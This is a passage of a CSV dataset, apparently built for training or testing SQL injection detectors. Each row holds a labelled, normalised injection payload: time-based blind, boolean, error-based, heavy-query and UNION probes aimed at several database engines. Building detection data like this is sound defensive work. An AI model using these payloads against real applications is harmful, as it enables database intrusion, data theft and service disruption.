row_index,payload_norm,label,sqli_type_hint
11190,-4215 ) where 5782 = 5782 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1,
11191,1' where 1045 = 1045 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,1,
11192,"1"" where 7344 = 7344 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --",1,
11193,1' ) as chla where 6098 = 6098,1,
11194,"1 union all select null,null,null,null,null,null,null,null#",1,
11195,1%' ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( '%' = ',1,
11196,"-2033"" ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
11197,"1%"" ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
11198,"1'|| ( select 'fpfl' from dual where 1434 = 1434 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ||'",1,
11199,1 ) ) ) rlike sleep ( 5 ) #,1,
11200,"( select count ( * ) from generate_series ( 1,5000000 ) )",1,
11201,"-1504"" ) as wpes where 6256 = 6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#",1,
11202,1 ) where 9683 = 9683,1,
11203,1%' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1,
11204,1 ) union all select null--,1,
11205,"1' ) and elt ( 1210 = 1210,sleep ( 5 ) )",1,
11206,"1 where 6040 = 6040 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
11207,"-4954%"" ) or 5244 = 4832",1,
11208,"1"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ""fkmh"" = ""fkmh",1,
11209,-8045 ) ) ) order by 1--,1,
11210,"1' ) where 4786 = 4786 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1,
11211,"1%"" order by 1--",1,
11212,1'|| ( select 'qtep' where 2572 = 2572 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1,
11213,1 ) as zmxb where 8424 = 8424 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,1,
11214,"1"" union all select null,null,null,null,null,null,null--",1,
11215,"1 ) ) as queb where 2449 = 2449 union all select null,null#",1,
11216,"1' ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( 'javh' = 'javh",1,
11217,1' ) where 8167 = 8167,1,
11218,"1' ) ) as hmyc where 6732 = 6732 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1,
11219,"-9150%' ) ) ) union all select 7057,7057,7057,7057,7057,7057,7057,7057--",1,
